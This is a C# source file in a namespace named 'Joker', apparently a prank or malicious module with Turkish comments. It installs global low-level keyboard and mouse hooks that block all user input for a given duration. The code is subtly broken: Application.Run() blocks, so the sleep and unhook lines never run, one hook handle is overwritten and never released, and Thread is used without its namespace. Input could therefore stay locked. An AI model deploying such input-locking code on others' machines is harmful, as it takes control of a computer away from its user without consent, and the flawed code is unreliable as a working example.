using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Joker
{
    public class Keyboard
    {
        private static IntPtr hookId = IntPtr.Zero;

        // Kanca tipleri
        private const int WH_KEYBOARD_LL = 13;
        private const int WH_MOUSE_LL = 14;

        // User32.dll'den gerekli fonksiyonlar
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        // Klavye ve fare kancalarını işlemek için gereken delegeler
        private delegate IntPtr LowLevelProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static LowLevelProc keyboardProc = KeyboardHookCallback;
        private static LowLevelProc mouseProc = MouseHookCallback;

        public static void Main(int sure)
        {
            // Klavye ve fareyi devre dışı bırak
            hookId = SetHook(keyboardProc, WH_KEYBOARD_LL);
            hookId = SetHook(mouseProc, WH_MOUSE_LL);

            Application.Run();
            Thread.Sleep(sure);
            // Çıkışta klavye ve fareyi tekrar etkinleştir
            UnhookWindowsHookEx(hookId);
        }

        private static IntPtr SetHook(LowLevelProc proc, int hookType)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(hookType, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        // Klavye girişini engelleyen callback fonksiyon
        private static IntPtr KeyboardHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                // Tüm klavye girdilerini engeller
                return (IntPtr)1;
            }
            return CallNextHookEx(hookId, nCode, wParam, lParam);
        }

        // Fare girişini engelleyen callback fonksiyon
        private static IntPtr MouseHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                // Tüm fare girdilerini engeller
                return (IntPtr)1;
            }
            return CallNextHookEx(hookId, nCode, wParam, lParam);
        }
    }
}
